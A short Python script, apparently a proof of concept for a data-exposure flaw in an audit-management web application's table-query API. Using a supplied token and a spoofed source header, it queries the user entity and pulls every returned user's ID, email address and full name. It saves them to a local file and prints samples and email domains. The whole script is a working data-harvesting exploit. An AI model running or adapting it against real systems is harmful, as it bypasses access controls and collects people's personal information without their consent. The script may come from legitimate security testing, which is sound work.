import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def post(path,body):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-AuditBoard-Source: SchemaTable Rows','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
c,txt=post('/api/v1/table/query?entities=user',{"ab:query":{"entities":["user"],"filter":{},"include":["user"]}})
d=json.loads(txt); inc=d.get('included') or []
print("USERS exposed:",len(inc))
print("meta:",json.dumps(d.get('meta'))[:200])
emails=[(i['id'],(i.get('attributes') or {}).get('email'),(i.get('attributes') or {}).get('fullName')) for i in inc]
json.dump(emails,open('state/users_exposed.json','w'),indent=1)
for e in emails[:12]: print("  ",e)
print("  ...")
print("total emails:",sum(1 for e in emails if e[1]))
print("domains:",sorted(set((e[1] or '').split('@')[-1] for e in emails if e[1])))
